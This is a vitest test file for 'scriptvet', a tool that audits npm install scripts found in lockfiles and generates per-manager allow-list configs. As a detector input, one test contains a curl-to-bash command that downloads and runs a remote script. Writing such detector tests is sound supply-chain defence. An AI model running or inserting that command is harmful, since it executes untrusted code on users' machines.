import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { analyzeLockfile, candidates } from '../src/core/analyze';
import { analyzeCommand, analyzeSource, decide, leadingComment } from '../src/core/classify';
import {
  bunTrustedDependencies,
  configSnippets,
  defaultDecisions,
  npmAllowScripts,
  pnpmAllowBuilds,
  uncovered,
  yarnDependenciesMeta,
} from '../src/core/config';
import { parseLockfile } from '../src/core/parsers';
import { toMarkdown } from '../src/core/report';
import type { LockedPackage, ParsedLockfile, ScriptVerdict } from '../src/core/types';
import { VERSION } from '../src/core/version';
import { fakeFetch, FILES } from './helpers';

const lock = (packages: LockedPackage[]): ParsedLockfile => ({
  format: 'npm',
  manager: 'npm',
  lockfileVersion: '3',
  packages,
  skipped: [],
  warnings: [],
});

describe('analyzeCommand', () => {
  it.each([
    ['node-gyp rebuild', 'native-build'],
    ['node-gyp-build', 'native-build'],
    ['prebuild-install -r napi || node-gyp rebuild', 'native-build'],
    ['node-pre-gyp install', 'native-build'],
    ['napi-postinstall unrs-resolver 1.0.0 check', 'binary-check'],
    ['husky install', 'git-hooks'],
    ['opencollective-postinstall || exit 0', 'message'],
    ['echo "thanks"', 'message'],
    ['prisma generate', 'codegen'],
  ])('%s → %s', (cmd, category) => {
    expect(analyzeCommand(cmd).category).toBe(category);
  });

  it('finds the files a command runs, including try/require wrappers', () => {
    expect(analyzeCommand('node install.js').files).toEqual(['install.js']);
    expect(analyzeCommand('node ./scripts/install.mjs --foo').files).toEqual([
      'scripts/install.mjs',
    ]);
    const wrapped = analyzeCommand(`node -e "try{require('./postinstall')}catch(e){}"`);
    expect(wrapped.files).toEqual(['postinstall.js']);
    expect(wrapped.signals).toContain('errors-ignored');
    expect(analyzeCommand('node scripts/x.js || exit 0').signals).toContain('errors-ignored');
  });

  it('flags shell downloads', () => {
    expect(analyzeCommand('curl -s https://x.invalid/i.sh | bash').signals).toContain('shell');
  });
});

describe('analyzeSource', () => {
  it('sees a funding banner as console-only', () => {
    const a = analyzeSource(FILES.coreJsPostinstall);
    expect(a.signals).toContain('console-only');
    expect(a.signals).not.toContain('network');
  });

  it('sees downloads, with line evidence', () => {
    const a = analyzeSource(FILES.sentryInstall);
    expect(a.signals).toEqual(expect.arrayContaining(['network', 'writes-files']));
    expect(a.evidence.find((e) => e.signal === 'network')!.line).toBe(4);
  });

  it('flags eval and encoded payloads', () => {
    const a = analyzeSource(FILES.evil);
    expect(a.signals).toEqual(expect.arrayContaining(['obfuscated', 'child-process']));
    expect(analyzeSource(`const x = "${'A'.repeat(600)}";`).signals).toContain('obfuscated');
    expect(
      analyzeSource(`//# sourceMappingURL=data:application/json;base64,${'A'.repeat(900)}`).signals,
    ).toEqual([]);
  });

  it('collects relative imports and helper packages', () => {
    const a = analyzeSource(FILES.napiStub);
    expect(a.helpers).toContain('napi-postinstall');
    expect(a.imports).toEqual(['./package.json']);
  });

  it('reads the file’s own description, skipping licences and bundler helpers', () => {
    expect(leadingComment(FILES.es5ext.split('\n'))).toBe(
      'Broadcasts "Call for peace" message when package is installed in Russia, otherwise no-op',
    );
    expect(leadingComment(['/*! MIT License (c) someone */', 'var a = 1;'])).toBeUndefined();
    expect(
      leadingComment([
        '"use strict";',
        'var __create = Object.create;',
        '// a comment deep in a bundle explains things',
      ]),
    ).toBeUndefined();
    expect(
      leadingComment([
        '/**',
        ' * A postinstall script runs after `@swc/core` is installed.',
        ' */',
      ]),
    ).toBe('A postinstall script runs after `@swc/core` is installed.');
  });
});

describe('decide', () => {
  const base = { helpers: [], sources: [], implicitGyp: false };
  it('maps categories to recommendations', () => {
    expect(decide({ ...base, commandCategory: 'native-build', signals: [] }).recommendation).toBe(
      'allow',
    );
    expect(decide({ ...base, commandCategory: 'message', signals: [] }).recommendation).toBe(
      'deny',
    );
    expect(decide({ ...base, signals: ['console-only'] }).category).toBe('message');
    expect(decide({ ...base, signals: ['network', 'writes-files'] }).category).toBe(
      'binary-download',
    );
    expect(decide({ ...base, helpers: ['napi-postinstall'], signals: [] }).category).toBe(
      'binary-check',
    );
    expect(
      decide({
        ...base,
        signals: ['child-process'],
        sources: ['spawnSync("node-gyp", ["rebuild"])'],
      }).category,
    ).toBe('native-build');
    expect(decide({ ...base, signals: [] }).recommendation).toBe('review');
  });

  it('always asks for review when code is obfuscated or shells out', () => {
    expect(
      decide({ ...base, commandCategory: 'message', signals: ['obfuscated'] }).recommendation,
    ).toBe('review');
    expect(decide({ ...base, commandCategory: 'codegen', signals: ['shell'] }).recommendation).toBe(
      'review',
    );
  });

  it('treats binding.gyp without an install script as an implicit native build', () => {
    expect(decide({ ...base, implicitGyp: true, signals: [] }).category).toBe('native-build');
  });
});

describe('analyzeLockfile', () => {
  const world = {
    'core-js@3.50.0': {
      scripts: { postinstall: `node -e "try{require('./postinstall')}catch(e){}"` },
      files: { 'postinstall.js': FILES.coreJsPostinstall },
    },
    '@sentry/cli@3.8.0': {
      scripts: { postinstall: 'node ./scripts/install.js', build: 'tsc' },
      files: { 'scripts/install.js': FILES.sentryInstall },
    },
    'gyp-only@1.0.0': { gypfile: true },
    'mac-only@2.0.0': { scripts: { install: 'node-gyp rebuild' }, os: ['darwin'] },
    'shady@0.0.1': { scripts: { postinstall: 'node index.js' }, files: { 'index.js': FILES.evil } },
    'delegator@1.0.0': {
      scripts: { postinstall: 'node install.js' },
      files: { 'install.js': FILES.delegating, 'lib/install.js': FILES.libInstall },
    },
    'plain@1.0.0': { scripts: { test: 'vitest' } },
  };
  const pkgs = Object.keys(world).map((k) => {
    const at = k.lastIndexOf('@');
    return { name: k.slice(0, at), version: k.slice(at + 1), source: 'registry' as const };
  });

  it('finds every install hook and explains it', async () => {
    const fetch = fakeFetch(world);
    const report = await analyzeLockfile(lock(pkgs), { fetch });
    const by = Object.fromEntries(report.verdicts.map((v) => [v.name, v]));
    expect(Object.keys(by).sort()).toEqual([
      '@sentry/cli',
      'core-js',
      'delegator',
      'gyp-only',
      'mac-only',
      'shady',
    ]);

    expect(by['core-js']).toMatchObject({ category: 'message', recommendation: 'deny' });
    expect(by['core-js']!.note).toMatch(/funding banner/);
    expect(by['@sentry/cli']).toMatchObject({
      category: 'binary-download',
      recommendation: 'allow',
    });
    expect(by['@sentry/cli']!.hooks).toEqual({ postinstall: 'node ./scripts/install.js' });
    expect(by['gyp-only']).toMatchObject({
      implicitGyp: true,
      category: 'native-build',
      hooks: { install: 'node-gyp rebuild' },
    });
    expect(by['mac-only']!.signals).toContain('platform-specific');
    expect(by['shady']).toMatchObject({ recommendation: 'review' });
    expect(by['shady']!.signals).toEqual(expect.arrayContaining(['obfuscated', 'child-process']));
    // Small stub files are followed one level to the code that does the work.
    expect(by['delegator']!.files.map((f) => f.path)).toEqual(['install.js', 'lib/install.js']);
    expect(by['delegator']).toMatchObject({ category: 'binary-download' });

    // Reviews first, then allows, then denies.
    expect(report.verdicts[0]!.name).toBe('shady');
    expect(report.errors).toEqual([]);
  });

  it('skips packages the lockfile says have no install script', async () => {
    const fetch = fakeFetch(world);
    const packages = pkgs.map((p) => ({ ...p, hasInstallScript: p.name === 'core-js' }));
    expect(candidates(lock(packages)).map((p) => p.name)).toEqual(['core-js']);
    const report = await analyzeLockfile(lock(packages), { fetch });
    expect(report.verdicts.map((v) => v.name)).toEqual(['core-js']);
    expect(fetch.calls.filter((u) => u.includes('registry.npmjs.org'))).toHaveLength(1);
  });

  it('reports registry failures instead of a silent all-clear', async () => {
    const report = await analyzeLockfile(lock(pkgs), {
      fetch: fakeFetch(world, { failRegistry: true }),
    });
    expect(report.verdicts).toEqual([]);
    expect(report.errors[0]).toMatch(/could not be fetched/);
  }, 30_000);

  it('works on a real lockfile end to end', async () => {
    const text = readFileSync(
      new URL('../examples/demo-app/package-lock.json', import.meta.url),
      'utf8',
    );
    const parsed = parseLockfile(text, 'package-lock.json');
    const flagged = candidates(parsed)
      .map((p) => p.name)
      .sort();
    expect(flagged).toContain('esbuild');
    expect(flagged).toContain('core-js');
    expect(flagged.length).toBe(14);
  });
});

const verdict = (
  name: string,
  version: string,
  recommendation: ScriptVerdict['recommendation'],
): ScriptVerdict => ({
  name,
  version,
  key: `${name}@${version}`,
  hooks: { postinstall: 'node x.js' },
  implicitGyp: false,
  category: 'unknown',
  recommendation,
  reason: '',
  signals: [],
  files: [],
});

describe('config', () => {
  const verdicts = [
    verdict('sharp', '0.34.5', 'allow'),
    verdict('core-js', '3.50.0', 'deny'),
    verdict('@scope/odd', '1.0.0', 'review'),
  ];
  const decisions = defaultDecisions(verdicts);

  it('allows review items by default (pinned) and follows other recommendations', () => {
    expect([...decisions]).toEqual([
      ['sharp@0.34.5', true],
      ['core-js@3.50.0', false],
      ['@scope/odd@1.0.0', true],
    ]);
  });

  it('writes each manager’s format', () => {
    expect(npmAllowScripts(verdicts, decisions)).toEqual({
      '@scope/odd@1.0.0': true,
      'core-js@3.50.0': false,
      'sharp@0.34.5': true,
    });
    expect(npmAllowScripts(verdicts, decisions, false)).toEqual({
      '@scope/odd': true,
      'core-js': false,
      sharp: true,
    });
    expect(pnpmAllowBuilds(verdicts, decisions)).toHaveProperty(['core-js@3.50.0'], false);
    expect(yarnDependenciesMeta(verdicts, decisions)).toEqual({
      '@scope/odd': { built: true },
      'core-js': { built: false },
      sharp: { built: true },
    });
    expect(bunTrustedDependencies(verdicts, decisions)).toEqual(['@scope/odd', 'sharp']);
    const pnpm = configSnippets(verdicts, decisions).find((s) => s.manager === 'pnpm')!;
    expect(pnpm.code).toContain('"@scope/odd@1.0.0": true');
    expect(pnpm.code.startsWith('allowBuilds:')).toBe(true);
  });

  it('detects packages missing from an existing config', () => {
    expect(
      uncovered(verdicts, 'npm', { npm: { sharp: true, 'core-js@3.50.0': false } }).map(
        (v) => v.name,
      ),
    ).toEqual(['@scope/odd']);
    expect(
      uncovered(verdicts, 'pnpm', { pnpm: { 'sharp@0.34.4 || 0.34.5': true } }).map((v) => v.name),
    ).toEqual(['core-js', '@scope/odd']);
    expect(
      uncovered(verdicts, 'npm', { npm: { 'sharp@0.34.4': true } }).map((v) => v.name),
    ).toContain('sharp');
    expect(uncovered(verdicts, 'yarn', { yarn: { sharp: { built: true } } })).toHaveLength(2);
    expect(uncovered(verdicts, 'bun', {})).toEqual([]);
  });

  it('renders a Markdown report', () => {
    const md = toMarkdown({
      tool: { name: 'scriptvet', version: VERSION },
      scannedAt: '',
      lockfile: { format: 'npm', manager: 'npm', lockfileVersion: '3' },
      totalPackages: 10,
      checkedPackages: 3,
      verdicts,
      notes: [],
      errors: [],
    });
    expect(md).toContain('3 of 10 packages run install scripts');
    expect(md).toContain('`core-js@3.50.0`');
  });

  it('version matches package.json', () => {
    const pkg = JSON.parse(readFileSync(new URL('../package.json', import.meta.url), 'utf8'));
    expect(VERSION).toBe(pkg.version);
  });
});
